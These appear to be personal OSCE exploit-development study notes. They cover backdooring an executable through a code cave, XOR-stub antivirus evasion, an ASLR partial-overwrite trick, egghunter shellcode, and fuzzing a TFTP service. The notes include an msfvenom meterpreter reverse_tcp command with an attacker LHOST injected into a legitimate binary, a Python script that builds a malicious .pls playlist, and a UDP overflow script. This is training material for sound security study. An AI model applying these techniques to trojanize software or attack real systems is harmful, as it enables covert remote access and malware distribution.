## notes from teh OG OSCE, stuff is still relevant and good to know, will assist with future study (I hope)


CC = software breakpoint  

Can get around having to have a null byte in a return address if the original attack string/protocol requires a null, eg the SEH module where we fuzz and protocol contains null terminators, we can make our SEH overwrite 1 byte shorter and place it befire a null terminater which will be accepted by program  

For egg hunting in a payload stager, you need to specify the egg as ascii, it doesnt work in hex for some reason eg the T00W fiasco, also CASE SENSITIVITY hex values are different in upper/lower  

Debugging/RE Tips:  
    Looks at where registers point to at crash EG follow them in dump - does ESP land at the end of our buffer?  
in olly can select go to expression, enter address and set breakpoint there  


#### code cave  
pe editer, sections, new section header - give around 1000 bytes, make sure the section is executable.  
Then to make executable (it will expect to have an addition 1000bytes so will crash at start) open hex-editer XVI32  
In hex-editer go the end of the executable/wherever you put the code cove and pad it out with; HEX STRING: 00 Insert <n> times $1000  

Locate the new section in olly/ur fave debugger (view memory map) and note it  

look at files entry point, locate an instruction calling a function so that we can hijack it (ideally one before the application initialises)  
NOte down the instructions you'll be overwriting and their addresses (this is important because when you change entry to jmp, you will negate the first few   instructions and they must be restored) EG:  
446153  
```
Code cave start:
00446000

Entry point:
0041135E > $ E8 7BA40000    CALL tftpd32.0041B7DE ; would become 00446000 (location of our code cave)
00411363   .^E9 78FEFFFF    JMP tftpd32.004111E0
00411368  /$ 8BFF           MOV EDI,EDI
0041136A  |. 55             PUSH EBP
0041136B  |. 8BEC           MOV EBP,ESP
```

First we will edit the the first INSTRUCTION (call) by modifying it in olly to JMP 00446000, at 00446000 make first 2 instructions PUSHAD and PUSHFD as to preserve the original program so it can continue to run after our shellcode
Inject shellcode afterwards, format can be achieved with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.102.43 LPORT=443 -f hex`  

copy to executable, save file, run the code and take note of esp after preserving registers and AFTER running shellcode - we need this for ESP realignment  

before 0012ff80
after 0012fdd0 / 12fd7c  

subtract before from after, the result is how much we need to add in order to realign ESP so that normal program execution ensues after our shellcode 1B0, then we restore the original initial instructions:  

add esp,204
popfd
popad
call 0041B7DE
jmp 00411363

if you get a crash with ntdll.KiFastSystemCallRet in EIP either build payload with EXITFUNC=seh or replace the last call inst with 2 NOPs



#### AV evasion / code cave via XOR stub
open up binary locate code cave

Modify the binary in lordPE, edit the section containing codecave(.text) and make sure it is writeable
copy and hijack the initial instructions, jumping to beginning of located cave.

Take note of next (immediate) instruction address after entry point (post JMP modification) - as this is where our encoder will start. And then note of the LAST instruction address, as this is where we will cease encoding - and also as always take not of the first few instructions

JMP 0040a770
then
start: 00404c05
end: 0040a76f

00404c00 push ebp
00404c01 move ebp, ebp
00404c03 push -1

We will be placing an XOR stub at the beginning of cave, which will loop through the address range, changing the data after which it will save the file to disk.
Running the program AGAIN will produce the same loop - obviously as this is a XOR operation, the data is put back as it was while in memory

EG

mov,eax 00404c05            ; move next instruction after entry point into eax for XOR
xor byte ptr DS:[EAX],0f    ; XOR the byte pointed to by the address of the beginning of encoding scheme
inc eax                     ; increment eax (set up for the loop, we are getting ready to xor NEXT byte)
cmp eax, 0040a76f           ; compare current pointer with end address, which would signify end of loop
jle <address of XOR PTR>
<restored inst>
<restored inst>
<jmp to next inst after entry jmp>


#### ASLR bypass / two byte overwrite

ASLR randomises the higher two bytes of memory addresses, making it challenging to write reliable exploits

Once we confirm EIP control with an overflow, we shorten the attack by two bytes - effectively only overwriting the LOWER two bytes on EIP

eg we lower overflow by two and as a result at crash EIP is now 77b54343 - any instruction we locate in that range we can hijack, as the the bytes that are randomised will not be touched by our attack string and fill themselves in - while we can simply "append" the static higher two bytes which will complete the instruction.
EG.

JMP ESP is at 77B57A90
reboots place it at 76A17A90 or 77B17A90 or 749B7A90
if we overwrite EIP with XXXX7A90, we will ALWAYS hit that instruction


#### Egghunting 

Let's say you have a space of 11bytes to work with at crash (small overflow length)
Start by hijacking EIP with a JMP ESP, to get to the initial small buffer - so we locate a module containing a jmp esp, set a breakpoint and overflow EIP with this address
crash again and follow esp in dump - you should see that we have now hit the 11 byte shellcode
If you step over with f8 and place some instructions, we can give ourselves more space to work with

So, we will replace our string of 83 with a sub esp, 58 (176 bytes, just before where shellcode will be located as per buffer) and then a jmp esp, to jump to the location we just readjusted esp to

```
#!/usr/bin/python -w
import struct
#73625E0F   FFE4             JMP ESP



start= "[playlist]\r\nFile1=\\\\"
nop="\x90" * 856
shellcode ="\xcc" * 166
jmp="\x0f\x5e\x62\x73"+"\x83\x83\x83\x83\x83\x83\x83\x83"+"\x90\x90\x90\x90"
end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"


exploit = start + nop + shellcode + jmp + end
filename="poc.pls"
file = open(filename , 'w')
file.write(exploit)
file.close()
```




section .text
_start:


    ; build page_align
    page_align:
    or dx, 0xfff ; set dx to 4095, 4096 contains nulls!! (same is true for further pages)

    ; build next_addr
    next_addr:
    inc edx ; as explained above, necessary to move forward after or operation, to a multiple of 4096
    push edx ; save current mem location
    push 0x2, pop eax ; set syscall to NtAccessCheckAndAuditAlarm
    int 0x2e ; call syscall 
    cmp al, 0x05 ; after we interrupt, check if the return value that of ACCESS_VIOLATION
    pop edx ; restore mem address
    je page_align ; if ACCESS_VIOLATION present jump to page_align and scan next page

    mov eax, 0x57303054 ; lay egg
    mov edi, edx ; sets pointer to the current checked address
    scasd ; compare eax with dword inside eax to see if the egg is there
    jnz next_addr ; if no match increase counter ad run through again
    scasd ; compare AGAIN to make sure we havnt just found our egg hunter code (false postitive)
    jnz next_addr ; false positive, we found egghunter, start again

    jmp edi ; we found the egg, we will now jump to the pointer we we know our shellcode is



#### fuzzing

example:
locate a tftp service running on a server, review the softwares RFC to see which protocols it uses and how to recreate EG:

            2 bytes     string    1 byte     string   1 byte
            ------------------------------------------------
           | Opcode |  Filename  |   0  |    Mode    |   0  |
            ------------------------------------------------

With this info we can create a fuzzer (obviously will also need the opcodes, 2 is for write)
```
s_binary("0002");               # write opcode
s_string_variable("file.txt");  #in spike language, this will be our fuzzed parameter
s_binary("00");                 # terminating byte
s_string_variable("netascii");  # another fuzz point
s_binary("00");
sleep(1);
```
save this into an .spk file, we send with `generic_send_udp 192.168.102.151 69 tftp.spk 0 0 5000` (I had to adjust MTU on tun0 and windows as the packets too large got destroyed)

once we confirm that the crash occurred when sending the first parameter, we build a python script to take the attack further as below

```
#!/usr/bin/python
import socket
import sys
host = '192.168.240.135'
port = 69
try:
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
	print "socket() failed"
	sys.exit(1)
filename = "a"*5000

mode = "netascii"
muha = "\x00\x02" + filename+ "\0" + mode+ "\0" #packet is constructed as per the protocol used to fuzz and confirm a crash
s.sendto(muha, (host, port))
```

#### SEH
see my [article](https://kymb0.github.io/SEH-primer/), covered in depth

